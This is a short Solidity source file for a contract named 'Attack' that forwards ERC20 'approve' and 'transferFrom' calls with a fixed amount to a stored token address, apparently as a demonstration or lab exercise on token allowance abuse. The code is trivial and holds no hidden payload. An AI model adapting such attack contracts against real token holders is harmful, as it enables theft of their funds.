//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

contract Attack{
    uint public amt;
    address public addr;
    constructor(address _addr,uint _amt)public{
        amt=_amt;
        addr=_addr;
    }
    //this function should be called by the owner of the balance;
    function attackApprove(address spender)external{
        (bool success,)=addr.call(abi.encodeWithSignature("approve(address,uint256)",spender,amt));
        require(success,"approving sender failed");
    }

    function attackTransferFrom(address owner,address to)external{
        (bool success,)=addr.call(abi.encodeWithSignature("transferFrom(address,address,uint256)",owner,to,amt));
        require(success,"TransferFrom failed");
    }
}